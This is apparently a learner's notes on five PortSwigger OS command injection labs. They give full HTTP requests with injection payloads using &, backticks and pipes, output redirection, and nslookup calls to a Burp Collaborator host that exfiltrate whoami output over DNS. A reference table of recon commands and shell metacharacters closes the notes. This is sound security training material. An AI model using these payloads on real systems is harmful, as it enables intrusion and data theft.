<span style="color:yellow;font-weight:700;font-size:30px">
OS command injection: 5 Labs
</span>
https://portswigger.net/web-security/os-command-injection

# material:
https://www.hackingarticles.in/comprehensive-guide-on-os-command-injection/


# ***1. Lab: OS command injection, simple case***
https://portswigger.net/web-security/os-command-injection/lab-simple

 The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

To solve the lab, execute the whoami command to determine the name of the current user. 

1. check for vulenrabilty - use **& echo test** payload on different parameters in the stock check feature:
**request2**
> POST /product/stock HTTP/1.1
>
> productId=%26+echo+test&storeId=1
response:
> HTTP/1.1 200 OK
>
> test 1

2. use **& whoami** as payload in productId parameter:
> POST /product/stock HTTP/1.1
>
> productId=%26whoami&storeId=1

response:
> HTTP/1.1 200 OK
>
> /home/peter-nTKf4f/stockreport.sh: line 5: $1: unbound variable
> whoami: extra operand '1'
> Try 'whoami --help' for more information.

# Lab Solved!

# ***2. Lab: Blind OS command injection with time delays***
https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays

**hint:** & ping -c 12 127.0.0.1 &

 The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay. 


1. use feedback form and send **POST /feedback/submit HTTP/1.10** to repeater and add a sleep command - forcing it to execute by raping it with backticks ` 


> POST /feedback/submit HTTP/1.1
>
> csrf=EDFtuWvARiqb6kphtd4WMLS9R18avMVp&name=attcaker&email=clean%40token.com&subject=testsubtest&message=%26+`sleep+10`+%26

(also works: **&message=blah`+sleep+11+`**)

# Lab Solved!


# ***3. Lab: Blind OS command injection with output redirection***
https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection

 The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:
/var/www/images/

The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

To solve the lab, execute the whoami command and retrieve the output. 

**hint**: & whoami > /var/www/static/whoami.txt &
**writable folder:** /var/www/images/

1. use feedback form and send **POST /feedback/submit HTTP/1.10** to repeater and add a sleep command - forcing it to execute by raping it with backticks ` 

> POST /feedback/submit HTTP/1.1
>
> csrf=EDFtuWvARiqb6kphtd4WMLS9R18avMVp&name=attcaker&email=clean%40token.com&subject=testsubtest&message=%26+`sleep+10`+%26

once we get a 10 sec delay we know its vulnerable to OS Command injection

2. send the request with **&`whoami >/var/www/images/whoami.txt`&** command:
**request:**
> POST /feedback/submit HTTP/1.1
>
> csrf=Lbi0XPdDnCQyYdmKmtIwu2Cs8T6YSjKD&name=attcaker&email=stay%40here.com&subject=123+sbjct&message=%26`whoami+>/var/www/images/whoami.txt`%26

2. find a request to fetch an image like **GET /image?filename=5.jpg HTTP/1.1** (remember to check the **image** box in proxy scope to see them). send to repeater and change the file name to **whoami.txt**
**request**
> GET /image?filename=whoami.txt HTTP/1.1
response:
>HTTP/1.1 200 OK
>
>peter-pI2PeD

# lab solved

# ***4. Lab: Blind OS command injection with out-of-band interaction***
https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band

 The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator. 

**hint:** & nslookup kgji2ohoyw.web-attacker.com &
**Burp Colborator:** eas4279u4z1g4yv96sn4lpcjrax1npc.oastify.com

1. use nslookup to initiate a lookup for burp colaborator address:
> & nslookup eas4279u4z1g4yv96sn4lpcjrax1npc.oastify.com &
**request**:
> POST /feedback/submit HTTP/1.1
>
> csrf=bg9Jovb9NnF7wlflPiWjbx9KGd2De2rs&name=attcaker&email=clean%40token.com&subject=s&message=%26+`nslookup+eas4279u4z1g4yv96sn4lpcjrax1npc.oastify.com`+%26

# Lab Solved

# ***5. Lab: Blind OS command injection with out-of-band data exfiltration***
https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration

 The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab. 

**hint:** nslookup `whoami`.kgji2ohoyw.web-attacker.com &

1. use same payload as previeous lab but add the whoami command as sub domain and use Email field:
> & nslookup `whoami`.eas4279u4z1g4yv96sn4lpcjrax1npc.oastify.com &
(also works:)
> ||nslookup+`whoami`.7emx60dn8s598rz2alrxpigcv31u3is.oastify.com||

**request:**
POST /feedback/submit HTTP/1.1

csrf=8IbwqGXf7gMiDtK1oowJufwtmWkQlfz0&name=attcaker&email=%26nslookup+`whoami`.7emx60dn8s598rz2alrxpigcv31u3is.oastify.com%26&subject=sbjct&message=test

response in Burp colaborator:
> The Collaborator server received a DNS lookup of type A for the domain name peter-HLx27X.7emx60dn8s598rz2alrxpigcv31u3is.oastify.com.

copy the subdomain value (until the dot): **peter-HLx27X** paste in lab solution

# Lab Solved


<!-- testing payload in linux - didnt work in comment field:
─$ me=`whoami`.lc1b4eb1663n65xg8zpbnweqthz8uwj.oastify.com && nslookup $me                                                              1 ⨯
Server:         192.168.222.2
Address:        192.168.222.2#53

Non-authoritative answer:
kali.lc1b4eb1663n65xg8zpbnweqthz8uwj.oastify.com        canonical name = PublicInteractionNLB-3bddf5ff6abb91b6.elb.eu-west-1.amazonaws.com.
Name:   PublicInteractionNLB-3bddf5ff6abb91b6.elb.eu-west-1.amazonaws.com
Address: 3.248.33.252
Name:   PublicInteractionNLB-3bddf5ff6abb91b6.elb.eu-west-1.amazonaws.com
Address: 54.77.139.23 -->

# Useful commands

    When you have identified an OS command injection vulnerability, it is generally useful to execute some initial commands to obtain information about the system that you have compromised. Below is a summary of some commands that are useful on Linux and Windows platforms:
    Purpose of command 	    Linux 	        Windows
    Name of current user 	whoami 	        whoami
    Operating system 	    uname -a 	    ver
    Network configuration 	ifconfig 	    ipconfig /all
    Network connections 	netstat -an 	netstat -an
    Running processes 	    ps -ef 	        tasklist  
   

# Ways of injecting OS commands

A variety of shell metacharacters can be used to perform OS command injection attacks.

A number of characters function as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based systems:

    &
    &&
    |
    ||

The following command separators work only on Unix-based systems:

    ;
    Newline (0x0a or \n)

On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:

    `
    injected command `
    $(
    injected command )

Note that the different shell metacharacters have subtly different behaviors that might affect whether they work in certain situations, and whether they allow in-band retrieval of command output or are useful only for blind exploitation.

Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using " or ') before using suitable shell metacharacters to inject a new command. 